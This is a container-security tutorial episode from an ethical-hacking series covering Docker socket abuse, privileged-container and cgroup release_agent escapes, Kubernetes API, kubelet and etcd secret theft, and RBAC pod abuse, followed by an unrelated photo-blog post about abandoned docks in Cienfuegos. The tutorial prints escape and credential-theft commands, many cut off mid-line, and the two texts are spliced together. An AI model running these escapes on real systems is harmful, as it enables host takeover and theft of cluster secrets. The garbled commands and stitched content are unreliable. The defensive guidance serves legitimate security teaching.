### Solutions to Episode 36 Exercises

**Exercise 1:** Azure Storage + Managed Identity attack.

```bash
# Step 1: Public blob access (anonymous, no auth)
curl \

# Downloaded file contents -- anonymous access confirmed

# Step 2: From inside the VM, steal Managed Identity token
curl -H \

# Returns full subscription list with resource groups

# Step 4: Remediation
# Disable public blob access on the storage account
az storage account update --name mylab --allow-blob-public-access false
# Scope Managed Identity to minimum required permissions
# Reader at subscription level is too broad -- restrict to specific resource group
az role assignment delete --assignee MI_PRINCIPAL_ID --role \

\
    --scope /subscriptions/SUB_ID/resourceGroups/specific-rg
```

The full attack chain demonstrates the same pattern we've seen across every cloud provider: one public access misconfiguration (the blob container) provides initial access. The metadata service (IMDS) provides credential escalation. Overly broad role assignments provide lateral movement. Each fix is independent -- disable public access on storage, restrict the Managed Identity role, enable audit logging -- and defense-in-depth means any single fix breaks a link in the chain.

**Exercise 2:** AzureHound relationship types (abbreviated).

```text
Azure-specific relationships (not in on-prem SharpHound):
- AZOwns (user/SP owns Azure resource)
- AZContributor (contributor role on resource)
- AZKeyVaultContributor (can read Key Vault secrets)
- AZRunsAs (Managed Identity relationships)
- AZMemberOf (Azure AD group membership)
- AZGlobalAdmin (Global Administrator role assignment)

Top 3 dangerous misconfigs:
1. Application with high-privilege API permissions (Mail.ReadWrite.All)
2. Overprivileged Managed Identities (Contributor at subscription scope)
3. Guest users with elevated roles

Key difference vs on-prem: Azure attack paths often go through
Application Registrations and Service Principals, which have no
direct on-prem equivalent. On-prem paths chain through group
memberships and ACLs. Azure paths chain through app permissions,
role assignments, and service principal ownerships.
```

The fundamental insight from AzureHound is that Azure AD attack paths are structurally different from on-prem AD paths. In on-prem AD (episode 33), you chain through group memberships, delegation rights, and ACL misconfigurations. In Azure AD, you chain through application permissions, role assignments, and managed identity relationships. When you import BOTH datasets into BloodHound, the hybrid paths -- on-prem to cloud and back -- are often the most dangerous because they cross security domain boundaries that no single team typically monitors.

**Exercise 3:** Cloud metadata comparison table.

```text
             AWS                    Azure                  GCP
Endpoint     169.254.169.254        169.254.169.254        metadata.google.internal
Auth         None (v1)/Token (v2)   Metadata:true header   Metadata-Flavor:Google
Creds        IAM role temp keys     OAuth access token     OAuth access token
SSRF prot    IMDSv2 (PUT+token)     Header requirement     Header requirement
Defense      Enforce IMDSv2         Managed Identity       Workload Identity Fed

Most resilient to custom-header SSRF: AWS with IMDSv2 enforced.
IMDSv2 requires a PUT request to get a session token, then uses
that token in subsequent GET requests. Even SSRF with custom headers
cannot issue the initial PUT in most cases. Azure and GCP both
fall to any SSRF that can set custom headers.
```

AWS with IMDSv2 enforced is the most resilient because it requires a two-step process -- a PUT to get a session token, then a GET with that token. Most SSRF vulnerabilities that allow custom headers can only issue GET or POST requests, not PUT. Azure and GCP both rely on a single required header (`Metadata:true` and `Metadata-Flavor: Google` respectively), which any SSRF that supports custom headers will bypass. The lesson: a header requirement is better than nothing (blocks basic GET-only SSRF), but a separate token-acquisition step is stronger.

# Learn Ethical Hacking (#37) - Container Security - Docker and Kubernetes Attacks

Episodes 35 and 36 covered cloud security across AWS, Azure, and GCP -- IAM privilege escalation, public storage buckets, metadata services, credential theft, and the tools that map attack paths across multi-cloud environments. You can now enumerate cloud environments with ScoutSuite and Prowler, exploit overpermissive IAM policies, steal credentials via SSRF against metadata endpoints, and understand why the shared responsibility model means most breaches are the customer's fault.

But here is the thing about modern cloud deployments: when an organization says \

The actual workloads running inside those cloud environments are containerized. And containers introduce their own security model -- their own isolation boundaries, their own identity systems, their own networking, their own secret management -- layered on TOP of the cloud provider's model.

More layers means more complexity. More complexity means more misconfigurations. More misconfigurations means more attack surface. You know how this goes by now ;-)

### Containers Are Not Virtual Machines

This is the single most important thing to understand about container security, and I cannot stress this enough: **containers are NOT virtual machines**. The mental model that most developers have -- \

-- is dangerously wrong from a security perspective, and it leads to assumptions about isolation that simply do not hold.

A virtual machine has its own kernel. Its own operating system. Its own memory space. A hypervisor mediates every interaction between the guest and the host hardware. To escape a VM, you need to exploit a vulnerability in the hypervisor itself -- a genuinely hard problem (though not impossible, as Pwn2Own entries have demonstrated).

A container shares the host kernel. It uses Linux **namespaces** for isolation (separate PID, network, mount, user, and IPC spaces) and **cgroups** for resource limits (CPU, memory, I/O). The container process is just a regular process on the host, running with some restrictions applied by the kernel. There is no hypervisor. There is no separate kernel. The isolation is enforced by kernel features, not by a hardware boundary.

The security implication: **if you escape a container, you are directly on the host.** There is no hypervisor layer to break through. Container escape equals host compromise. And because Kubernetes clusters typically run many pods on the same node, escaping one container can give you access to every other container on that node -- plus the node itself, which likely has credentials for the Kubernetes API, cloud provider metadata, and secrets for dozens of other workloads.

```bash
# Check what kernel you're running inside a container
uname -r
# 6.1.0-18-amd64
# This is the HOST kernel -- there is no guest kernel

# Check the cgroup for the current process
cat /proc/1/cgroup
# 0::/system.slice/docker-abc123.scope
# The process lives in a cgroup controlled by Docker

# Check the namespace ID
ls -la /proc/1/ns/
# Shows: cgroup, ipc, mnt, net, pid, user, uts
# Each is a namespace restriction, NOT a VM boundary
```

I've seen pentest reports where the tester wrote \

because they treated the container like a VM. They ran a few basic commands, found they couldn't see the host filesystem, and concluded the isolation was adequate. They didn't check for mounted sockets. They didn't check for privileged mode. They didn't check for misconfigured capabilities. Container isolation is only as strong as its configuration, and the default configuration in many environments is far weaker than people assume.

### The Docker Socket -- The Keys to the Kingdom

If there is one single vulnerability pattern you remember from this episode, make it this one. The Docker socket (`/var/run/docker.sock`) is the API endpoint that controls the Docker daemon. Whoever has access to this socket can create containers, start them, stop them, exec into them, and -- critically -- create containers with full access to the host filesystem.

The problem: developers and CI/CD pipelines routinely mount the Docker socket INTO containers. Jenkins needs to build Docker images? Mount the socket. A monitoring tool needs to inspect running containers? Mount the socket. A deployment tool needs to pull and start new containers? Mount the socket. Every one of these creates a trivial escape path:

```bash
# Check if docker.sock is mounted inside your container
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 May 25 /var/run/docker.sock
# If this file exists: game over

# Use the Docker API directly via curl
# List all containers on the host
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# Create a new container with the host filesystem mounted
curl -s --unix-socket /var/run/docker.sock \
    -X POST http://localhost/containers/create \
    -H \

}

# Start the container
curl -s --unix-socket /var/run/docker.sock \
    -X POST http://localhost/containers/CONTAINER_ID/start

# Read the output -- you now have /etc/shadow from the HOST
curl -s --unix-socket /var/run/docker.sock \
    http://localhost/containers/CONTAINER_ID/logs?stdout=true
```

This is the same concept from episode 31 (Docker group privilege escalation on Linux) but from inside a container. The principle is identical: access to the Docker API = root on the host. The Docker socket is the API. If it's mounted inside a container, anyone with code execution in that container can escape.

Having said that, I want to make clear that mounting the Docker socket is sometimes genuinely necessary -- CI/CD systems like Jenkins really do need to build images, and the alternatives (Docker-in-Docker with `--privileged`, running a separate Docker daemon, using Kaniko or Buildah for rootless builds) each have their own tradeoffs. The problem is not that the socket is ever mounted -- it's that it's mounted without understanding the security implication, and without compensating controls (read-only access, restricted API proxy, dedicated build nodes isolated from production).

### Container Escape via Privileged Mode

Containers started with `--privileged` have almost no isolation from the host. The `--privileged` flag essentially disables all the security restrictions that make a container a container: it grants ALL Linux capabilities, it gives access to ALL host devices, it disables AppArmor and SELinux restrictions, and it allows mounting the host filesystem:

```bash
# Check if you're running in a privileged container
cat /proc/1/status | grep CapEff
# Privileged: 000001ffffffffff (all capabilities)
# Normal:     00000000a80425fb (limited set)

# If privileged, mount the host filesystem directly
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
ls /tmp/hostfs
# bin  boot  dev  etc  home  lib  ...
# That's the entire host filesystem

# Read sensitive host files
cat /tmp/hostfs/etc/shadow
cat /tmp/hostfs/root/.ssh/id_rsa
cat /tmp/hostfs/root/.bash_history
```

There's also the **cgroup escape** technique, which works in some privileged containers even when the filesystem is not directly mountable. This exploit abuses the `release_agent` mechanism in cgroups to execute arbitrary commands on the host:

```bash
# Cgroup release_agent escape (requires privileged container)
# Create a temp cgroup
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/escape

# Set up the escape
echo 1 > /tmp/cgrp/escape/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo \

> /tmp/cgrp/release_agent

# Write the command to execute on the host
echo '#!/bin/sh' > /cmd
echo \

>> /cmd
chmod +x /cmd

# Trigger the escape by writing to cgroup.procs
sh -c \

# Read the output
cat /output
# uid=0(root) gid=0(root) groups=0(root)
# That's root on the HOST, not inside the container
```

Why does `--privileged` get used? The same reason `\

` gets used in IAM policies (episode 35): it's the fastest way to make something work. Developer needs GPU access in a container? `--privileged`. Need to run `systemd` inside a container? `--privileged`. Need network debugging tools that require raw sockets? `--privileged`. Every one of these has a narrower solution -- specific device access, specific capabilities, specific `sysctl` settings -- but `--privileged` is one flag and it works immediately.

### Secrets in Container Images

Docker images are layered. Every `RUN`, `COPY`, or `ADD` instruction in a Dockerfile creates a new layer. Here's the security problem: if a secret was added in one layer and deleted in a later layer, **it still exists in the image history**. Docker images are like git repositories -- nothing is truly deleted, it's just no longer visible in the current state.

```bash
# Inspect image layers -- see every command that built the image
docker history target-image:latest
# IMAGE          CREATED        CREATED BY                           SIZE
# abc123         2 days ago     CMD [\

]              0B
# def456         2 days ago     RUN rm /app/credentials.json         0B
# ghi789         2 days ago     COPY credentials.json /app/          145B
# jkl012         2 days ago     RUN pip install -r requirements.txt  89.2MB
# ...
# Notice: credentials.json was COPIED and then DELETED
# The deletion layer (def456) removes it from the current view
# But the COPY layer (ghi789) still contains the file

# Extract ALL layers and search for secrets
docker save target-image:latest -o image.tar
tar xf image.tar
find . -name \

# Or use dive for interactive layer inspection
dive target-image:latest
# Navigate through each layer, see exactly what files were added/modified/deleted
```

This is not a theoretical risk. I've pulled production images from Docker Hub and found AWS access keys, database passwords, TLS private keys, and API tokens baked into layers that were supposedly cleaned up in later build steps. The correct approach is to NEVER put secrets in a Dockerfile -- use build arguments for build-time secrets (though those are visible in `docker history` too), or better yet, inject secrets at runtime via environment variables or a secrets manager.

**Trivy** and **Grype** scan images for known vulnerabilities in installed packages, and also detect common secret patterns in image layers:

```bash
# Scan an image for vulnerabilities AND secrets
trivy image --scanners vuln,secret nginx:latest
# Shows CVEs by severity + any detected secrets in layers

# Compare vulnerability counts across image variants
trivy image nginx:latest          # Debian-based, many packages
trivy image nginx:alpine          # Alpine-based, minimal packages
trivy image nginx:1.25-alpine     # Pinned version, minimal packages
# Alpine variants typically have 80-90% fewer vulnerabilities
# because they contain fewer installed packages to have CVEs in
```

### Kubernetes -- The Orchestration Attack Surface

If Docker is about running individual containers, **Kubernetes** (K8s) is about orchestrating thousands of them. And Kubernetes adds a MASSIVE attack surface on top of Docker. A K8s cluster has:

- **API Server** (port 6443) -- the control plane, manages everything
- **etcd** (port 2379) -- the database storing ALL cluster state including secrets
- **kubelet** (port 10250) -- agent on each node, runs pods
- **kube-proxy** -- handles network routing between services
- **Pods, Services, Secrets, ConfigMaps, ServiceAccounts** -- all your targets

Every one of these components is a potential attack vector when misconfigured. And Kubernetes misconfiguration is _extremely_ common because the default settings are designed for ease of getting started, not for security. Sound familiar? It's the same pattern as cloud IAM policies (episode 35), Azure AD tenant defaults (episode 36), and basically every other system we've covered in this entire series.

### Exposed API Server

The Kubernetes API server is the front door to the entire cluster. If it's accessible from the internet without authentication (or with anonymous auth enabled), you can read every secret, create pods, modify deployments, and effectively own the entire cluster:

```bash
# Check if the API server is accessible without auth
curl -k https://TARGET:6443/api
# If returns JSON with \

-- API is exposed

# List all namespaces
curl -k https://TARGET:6443/api/v1/namespaces

# Read ALL secrets in ALL namespaces (the jackpot)
curl -k https://TARGET:6443/api/v1/secrets
# Returns base64-encoded secrets for every service in the cluster
# Database passwords, API keys, TLS certificates, service tokens

# If kubectl is available:
kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify \
    get secrets --all-namespaces -o json
```

Anonymous authentication on the API server is rare in modern clusters (disabled by default since K8s 1.6), but it still shows up in test environments that get promoted to production, in clusters deployed with permissive Ansible/Terraform templates, and in managed Kubernetes services where the admin assumed \

### Kubelet API -- Direct Pod Execution

The kubelet runs on every node and manages the pods on that node. Its API (port 10250) lets you list pods and execute commands inside them. If the kubelet API is exposed without authentication, you can execute commands in ANY pod on that node:

```bash
# Check if kubelet API is accessible
curl -k https://NODE_IP:10250/pods
# Returns JSON listing every pod on this node

# Execute a command in a specific pod
curl -k -X POST \
    \

# Enumerate all pods and look for interesting containers
curl -k https://NODE_IP:10250/pods | python3 -c \

```

This is often more useful than the API server attack because even clusters with properly secured API servers sometimes leave the kubelet API open. Network policies (if they exist at all) typically focus on pod-to-pod communication, not on restricting access to the kubelet port.

### RBAC Misconfigurations -- The Cloud IAM Parallel

Kubernetes has its own role-based access control system, and it suffers from the same problems as cloud IAM. The most common RBAC misconfigurations:

```bash
# From inside a pod, check what your service account can do
kubectl auth can-i --list
# If you see: Resources: [*], Verbs: [*]
# That's cluster-admin -- you own the cluster

# Common misconfigurations:
# 1. Default service account with cluster-admin
# 2. Wildcard permissions: verbs=[\

]
# 3. Ability to create pods (= ability to escape to the node)
# 4. Access to secrets in other namespaces
# 5. Permission to exec into pods (= code execution everywhere)

# If you can create pods, create a privileged one:
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  containers:
  - name: pwn
    image: alpine
    command: [\

]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: false
EOF

kubectl exec -it pwned -- chroot /hostfs /bin/bash
# Root on the node
```

The `create pods` permission in Kubernetes is equivalent to `iam:PassRole` in AWS (episode 35) or `iam.serviceAccounts.actAs` in GCP (episode 36). It sounds innocuous -- \

But a pod can mount the host filesystem, run as privileged, mount secrets from any namespace, and use the node's cloud provider credentials via the metadata service. The ability to create a pod IS the ability to own the node. And by extension, if the node has access to the cloud metadata service (which it almost always does), creating a pod is a path to cloud account compromise.

This is the layering problem in action: Kubernetes RBAC sits on top of cloud IAM, which sits on top of Linux permissions. A single misconfiguration in the Kubernetes layer cascades through Docker isolation and into the cloud layer beneath it.

### Secrets from etcd -- The Cluster's Crown Jewels

**etcd** is the key-value store that backs the entire Kubernetes cluster. Every piece of cluster state -- every pod definition, every secret, every config map, every role binding -- lives in etcd. If you can access etcd directly, you can read (and modify) everything:

```bash
# If etcd is accessible (port 2379, no client cert required)
# List all secret keys
ETCDCTL_API=3 etcdctl --endpoints=https://TARGET:2379 \
    --insecure-skip-tls-verify --insecure-transport \
    get /registry/secrets --prefix --keys-only

# Read a specific secret
ETCDCTL_API=3 etcdctl --endpoints=https://TARGET:2379 \
    --insecure-skip-tls-verify --insecure-transport \
    get /registry/secrets/default/my-secret

# Secrets in etcd are base64-encoded by default, NOT encrypted
# Unless encryption-at-rest is explicitly configured
echo \

| base64 -d
```

The encryption-at-rest situation for Kubernetes secrets is remarkably similar to the etcd problem in on-prem AD (episode 33) where `ntds.dit` contains all domain password hashes. etcd IS the `ntds.dit` of Kubernetes. By default, secrets in etcd are stored as base64 -- which is encoding, NOT encryption. Anyone with access to etcd can read every secret in the cluster. Encryption at rest is available and documented, but it requires explicit confguration and many clusters don't have it enabled.

### Container Image Supply Chain

The supply chain attack surface for containers is enormous. Docker Hub hosts millions of images, and developers pull them without thinking twice. A malicious or compromised base image affects every container built on top of it:

```bash
# Pull an image and scan for vulnerabilities
trivy image nginx:latest
# CRITICAL: 12   HIGH: 45   MEDIUM: 89   LOW: 67

# Common supply chain attacks:
# 1. Typosquatting: ngnix instead of nginx, mongodp instead of mongodb
# 2. Malicious official-looking images with crypto miners
# 3. Compromised base images (the xz/liblzma supply chain attack)
# 4. Outdated images with known CVEs never patched

# Always use specific version tags, NEVER :latest in production
# Bad:  FROM nginx:latest
# Good: FROM nginx:1.25.4-alpine@sha256:abc123...
# The digest pin (@sha256:...) ensures the exact image content

# Verify image signatures with cosign
cosign verify --key cosign.pub myregistry.io/myimage:v1.0
```

The `:latest` tag deserves special mention. In development, pulling `:latest` is convenient -- you always get the newest version. In production, it means you have no idea what you're actually running. The image behind `:latest` can change at any time -- the registry owner pushes a new version and every deployment that pulls `:latest` gets different code on the next restart. For a public image, this means an attacker who compromises the registry account can push a malicious image as `:latest` and every cluster pulling that image will run the attacker's code on the next pod restart. Pin your images. Use digest references. Verify signatures. This is the container equivalent of pinning dependency versions instead of using `*` in your package.json.

### Service Mesh and Network Policies

By default, Kubernetes networking is completely flat: every pod can talk to every other pod in the cluster. There is no network segmentation. A compromised pod in the `development` namespace can reach services in the `production` namespace. This is the equivalent of putting every server on the same VLAN with no firewall rules (remember network segmentation from episode 34?).

```yaml
# Default state: NO network policies = everything talks to everything
# This is the Kubernetes equivalent of \

# Fix: Default-deny NetworkPolicy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  # With no ingress/egress rules specified,
  # ALL traffic to/from pods in this namespace is denied
  # Then whitelist only what's needed
```

```yaml
# Example: allow only the frontend to talk to the backend
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - port: 8080
      protocol: TCP
```

Service meshes like **Istio** and **Linkerd** add another layer on top of network policies: mutual TLS between pods (every inter-service connection is encrypted and authenticated), fine-grained traffic policies, and observability. But they also add complexity -- and as we've established throughout this series, complexity is the enemy of security. A misconfigured Istio sidecar proxy can actually WEAKEN security by providing an additional attack surface. Only deploy a service mesh if you have the operational maturity to configure and maintain it correctly.

### Defense: Securing Containers and Kubernetes

```yaml
# 1. Pod Security Standards (PSS) -- enforce restricted profile
# This replaces the deprecated PodSecurityPolicy
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
# The \

profile prevents:
# - Privileged containers
# - Host networking, host PID, host IPC
# - Privilege escalation (allowPrivilegeEscalation: false)
# - Running as root
# - Writable root filesystem
# - Most Linux capabilities
```

```bash
# 2. NEVER mount docker.sock into containers
# Use Kaniko or Buildah for rootless image builds in CI/CD
# If you MUST mount the socket, use a restricted API proxy like
# Tecnativa/docker-socket-proxy that only allows specific API calls

# 3. NEVER run containers as --privileged
# Use specific capabilities instead:
# docker run --cap-add NET_ADMIN (instead of --privileged)
# docker run --device /dev/fuse (instead of --privileged)

# 4. Scan ALL images before deployment
# In CI/CD pipeline:
trivy image --exit-code 1 --severity CRITICAL myimage:v1.0
# Fail the pipeline if critical vulnerabilities are found

# 5. Enable etcd encryption at rest
# In kube-apiserver configuration:
# --encryption-provider-config=/path/to/encryption-config.yaml

# 6. Use OPA/Gatekeeper for policy enforcement
# Gatekeeper is a Kubernetes admission controller that evaluates
# pods against policies BEFORE they're created
# Example: deny any pod requesting privileged mode

# 7. Enable audit logging on the API server
# --audit-log-path=/var/log/kubernetes/audit.log
# --audit-policy-file=/etc/kubernetes/audit-policy.yaml

# 8. Use distroless or scratch base images
# FROM gcr.io/distroless/static:nonroot
# No shell, no package manager, no utilities
# An attacker who gets RCE can't even run 'ls' or 'cat'

# 9. Runtime security monitoring (Falco)
# Falco watches system calls and alerts on suspicious activity:
# - Shell spawned inside container
# - Sensitive file read (/etc/shadow, /etc/passwd)
# - Network connection to unexpected destination
# - Binary executed that wasn't in the original image
```

The **distroless** approach deserves highlighting because it flips the container security model on its head. Instead of building a full OS image and then trying to restrict what an attacker can do, you build an image with NOTHING except your application binary. No shell. No package manager. No `curl`. No `wget`. No `cat`. An attacker who achieves remote code execution inside a distroless container cannot do much with it -- there are no tools to use for reconnaissance, no shell to execute commands, no utilities to exfiltrate data. It doesn't prevent all attacks (they can still make network connections, read files through the application runtime), but it dramatically reduces the blast radius of a compromise.

### The AI Slop Connection

Container security is where the AI code generation problem hits especially hard. Developers ask AI assistants for help with Kubernetes manifests and Docker configurations, and the suggestions are consistently insecure:

- `securityContext: privileged: true` because \
\n- `FROM ubuntu:latest` instead of pinned distroless images because it's \
\n- Kubernetes Secrets in plaintext YAML committed to git because \

The pattern is identical to what we saw with cloud IAM in episodes 35 and 36: the AI generates the simplist configuration that works, and the simplest configuration is the most permissive one. A `securityContext` with `privileged: true`, `runAsRoot: true`, and `allowPrivilegeEscalation: true` is four lines of YAML. The secure alternative -- specific capabilities, non-root user, read-only filesystem, resource limits, seccomp profile -- is twenty lines. The AI optimizes for brevity. Security requires verbosity.

### The Bigger Picture

Container security is not a separate discipline -- it's the intersection of everything we've covered. Linux privilege escalation (episode 31) maps directly to container escape techniques. Network segmentation (episode 34) maps to Kubernetes network policies. Cloud IAM (episodes 35-36) maps to Kubernetes RBAC. Supply chain attacks map to container image security. And the metadata service attacks we covered in cloud episodes work exactly the same from inside a Kubernetes pod running on a cloud node -- `curl http://169.254.169.254/...` from a pod on an EKS node gives you the node's IAM role credentials.

The trend is clear: every layer of abstraction adds security surface. Physical servers had OS-level security. Virtual machines added hypervisor security. Cloud platforms added IAM and API security. Containers added image and runtime security. Kubernetes added orchestration and RBAC security. Each layer is supposed to provide isolation, and each layer introduces new ways that isolation can fail.

The next episodes will move into infrastructure-as-code and automation security -- because the YAML files and Terraform modules that deploy all these containers and cloud resources are themselves an attack surface. If you can compromise the CI/CD pipeline that deploys Kubernetes manifests, you don't need to escape a container or exploit an IAM policy. You just modify the deployment to include your backdoor, and the automation delivers it to production for you.

### Exercises

**Exercise 1:** Create a deliberately vulnerable Docker scenario: run a container with `/var/run/docker.sock` mounted as a volume (`docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh`). From inside the container, use the Docker API via `curl` to (a) list all containers on the host, (b) create a new privileged container with the host filesystem mounted at `/hostfs`, (c) start that container and verify you can read `/etc/shadow` from the host. Then remove the socket mount and verify the escape is no longer possible. Document the full attack chain and explain why CI/CD containers that mount the socket are high-value targets.

**Exercise 2:** Set up a **minikube** cluster. Create a pod with an overprivileged service account (bind the `cluster-admin` ClusterRole to the `default` ServiceAccount in the `default` namespace). From inside the pod, use `kubectl` to list all secrets in all namespaces. Then create proper RBAC: a new ServiceAccount with a Role that only allows reading ConfigMaps in its own namespace. Verify the restricted account cannot access secrets or resources in other namespaces. Document the RBAC configuration and explain why the `create pods` permission is equivalent to node-level access.

**Exercise 3:** Pull 3 popular Docker images (`nginx:latest`, `node:latest`, `python:latest`) and scan them with **Trivy**. Document: (a) total vulnerabilities per image broken down by severity (critical, high, medium, low), (b) the most severe CVE in each image and what it affects, (c) which vulnerabilities have fixes available. Then compare `nginx:latest` vs `nginx:alpine` vs `nginx:1.25-alpine` -- document the vulnerability count reduction. Save your analysis to `~/lab-notes/container-vuln-scan.md`.

---

title.title: Los muelles olvidados de Cienfuegos/The forgotten docks of Cienfuegos(ENG-ESP)se
title.body:
Hello fellow photography enthusiasts of this beautiful community! It's been a while since I've shared anything new. I've decided to revisit the forgotten piers of my city, so I visited the Junco Sur neighborhood, a peripheral area filled with buildings constructed mainly during the final years of the Soviet era. This neighborhood was founded in April 1986, and a pier was built near a beach there so that workers constructing the nuclear power plant could travel to the city of the same name, located on the other side of Jagua Bay. To reach the beach and the pier, which were once very popular, there was a road that is now a neglected and dilapidated track.
![](https://i.ecency.com/DQmZBfLkVtc12bwGsLyKkEX98TeB9EexdrjN5mpu4qwu8gd/20260522_175114.jpg)

But it is in these forgotten spaces where beauty is often found.
![](https://i.ecency.com/DQmaVxX4wYmZFEJUsZjWzyzdAvPEhunnqDneCgjabTsAESh/20260522_173311.jpg)

![](https://i.ecency.com/DQmdqdS6QM1HHj5Zpi7Mn6xWHYmXxrrzTGSMTjZC86DU73S/20260522_173341.jpg)

![](https://i.ecency.com/DQma2kZuUD5hU7SeNbuL31f9gfwTB8YpT9L45EeiRW5Jh6V/20260522_173349.jpg)

Nature, as always, begins to reclaim the space that was taken from it, especially when humans cover up spaces through neglect. However, in this solitude and oblivion, I have been able to find the most sublime art for my phone's lens.
![](https://i.ecency.com/DQmWREB2ZZrpfwRTapHKRGqmXXqVPZx1tWgvkwjofHZ5kCL/20260522_173416.jpg)

![](https://i.ecency.com/DQmVsNuprsSc5azF4PnM86kiJj5keoEFekPAtXtE97uMXt6/20260522_173429.jpg)

![](https://i.ecency.com/DQmUiYYNqwPqhzUdbLkLPP4y6AAQ7fDjhZBcR6dVZiBLq7D/20260522_173507.jpg)

![](https://i.ecency.com/DQmSWvAemtpeCNfsULebgtSHN9XPtSAVkidgyS15r63fK1X/20260522_173541.jpg)

When I started taking pictures of the pier, I noticed that some people still come to this place to enjoy its tranquility and engage in fishing activities, an activity as old as humankind itself.
![](https://i.ecency.com/DQmcBsJ5ydNz2mDrANfGHorxjUqQC7Efnr6RyVNw3thVmpi/20260522_173602.jpg)

![](https://i.ecency.com/DQmTGrZLCCASuJKn4A7iP8tQsznkMgYKLFsRtL8XipdFGse/20260522_173609.jpg)

As happens in places where no maintenance is carried out, rust has taken over and corroded the foundations.
![](https://i.ecency.com/DQma7K5r1XB9yGg72t1CqCHB7UrLYoi5T8isRz8PGJtjDYp/20260522_173622.jpg)

![](https://i.ecency.com/DQmbQWWJeftTysQzrJw6yV64NBbpUB5v6CaumZVnWtvykiy/20260522_173639.jpg)

![](https://i.ecency.com/DQmbXJK3WQWG8jiRJbg3APd6Gn9Z2agSj7NcHNCUBNrw3dB/20260522_173647.jpg)

I remember my mother bringing me to this beach when we visited one of my aunts who still lives in this neighborhood. We often took different boats to the Nuclear City or another one dedicated to outdoor activities, belonging to a now-defunct recreational association known as SEPMI.

This rusty piece reminds me of the mooring knots that helped boats dock.
![](https://i.ecency.com/DQmZm6JpxQFBQ1GUYUDGwENn7aZeiLFzgS3eMuomW75txEK/20260522_173833.jpg)

![](https://i.ecency.com/DQmV8i2DdQmwEKgK9QBbVWKNRmaTPspLjwW8NbS4JEcLsPC/20260522_173847.jpg)

![](https://i.ecency.com/DQmWUT746M4KgYV2JKjQRonNBxmg7T4Mu7WJ42rK1TnEDRC/20260522_173907.jpg)

![](https://i.ecency.com/DQmdvZDRfcapgy36NJFTbMFxaDTkhi1REtdxVVonnpmnFYf/20260522_173919.jpg)

There were also light towers that have since disappeared; this image looks like it's from another planet, like mountains in a cursed desert.
![](https://i.ecency.com/DQmSFyFLWPK48j7EfDzcPTRzp1HVUsWMLd7Z3MfQf7YhFJS/20260522_174126.jpg)

Then there's the sea, that beautiful space that sometimes makes us feel so small, so insignificant in the face of such power and beauty. I hope one day I can take underwater photos and revel in the beauty of the vastness of the waters.
![](https://i.ecency.com/DQmfDThxs3gMbLwoMUpZA3c1FoHVQceeaZvhVSY47Zu5KK9/20260522_174144.jpg)

I couldn't resist taking these photos, a must-have on a pier and in a city that lives on the sea. Fishing lines, or fishing in the most traditional Cuban way, without rods, with all the tranquility in the world to wait for the right fish, or the one destined to catch.
![](https://i.ecency.com/DQmTKJfZHFKxi5LCuDdrxi9orDHNQs7jkjS4Xa5afx2VdDb/20260522_174255.jpg)

![](https://i.ecency.com/DQmNzsutnqdE4cscK1za5cnncbJ167hUkhmdAT7St1NG4BW/20260522_174315.jpg)

![](https://i.ecency.com/DQmVzZf3cnDXdPfU2EigXAMJBhRWhHZU7exoitLHuVah61G/20260522_174440.jpg)

![](https://i.ecency.com/DQmRdG3qQva7N3jftMCPWxYgY9Loh2JkT63Jy5rpuasqAww/20260522_174501.jpg)

![](https://i.ecency.com/DQmXpzin2QkGoeWv2m6E4r7PEn1cLQD9QWezTAkDkARCWLg/20260522_174517.jpg)

![](https://i.ecency.com/DQmYT1TzrNA3E7JLHqP2Dk2DiXsG6e5MuAsK25soXaiHUv3/20260522_174556.jpg)

![](https://i.ecency.com/DQmZsoUpvKaghEAzggRokEhivi3dhWyz1YQickqg5wi3swZ/20260522_174640.jpg)

![](https://i.ecency.com/DQmXAGVCJFsCp4EEptwu65dN5xKHLwe7wbjLG6y5SoFVWhS/20260522_174901.jpg)

![](https://i.ecency.com/DQmbGgqhumt26MQHkjtKzuYTeprZvoDBQUyqminGTcg8WeG/20260522_174911.jpg)
As I was about to leave, a dog and its owner were enjoying the space. I hope you liked these photos.
![](https://i.ecency.com/DQmXMP5ERFBMvo2ajfgAwH2M7djPwMprKo3b9nnRoo5wjWt/texto_11_.jpg)

<center>![](https://i.ecency.com/DQmZgEYwbWXsPtnALCquFf8frbap3fDb9s56qGhCcPDj5KD/_al_nhyamar78_1_.jpg)</center>

<center>![](https://i.ecency.com/DQmVY4EGuTB3o3vzY8R4UPP3dV29hXJfLBVDNx5eRYcTprx/versi_n_en_espa_ol_2_.jpg)</center>

Hola amigos amantes de la fotografía de esta hermosa comunidad, hace un tiempo que no mostraba nada nuevo. he decidido retomar los muelles olvidados de mi ciudad, por eso visite el barrio de Junco sur, un barrio periférico lleno de edificios construidos en la última etapa la era soviética principalmente. Es un barrio que se fundó en abril de 1986 y en el se construyó un muelle cerca de una playa, para que los trabajadores que trabajaban en la construcción de la central electro-nuclear viajaran hasta la ciudad de mismo nombre que esta al otro lado de la Bahía de Jagua. 
Para llegar a la playa y el muelle que eran muy visitados, existía una carretera que actualmente es un camino olvidado y en mal estado.
![](https://i.ecency.com/DQmZBfLkVtc12bwGsLyKkEX98TeB9EexdrjN5mpu4qwu8gd/20260522_175114.jpg)

Pero es en estos espacios olvidados donde muchas veces se encuentra la belleza.
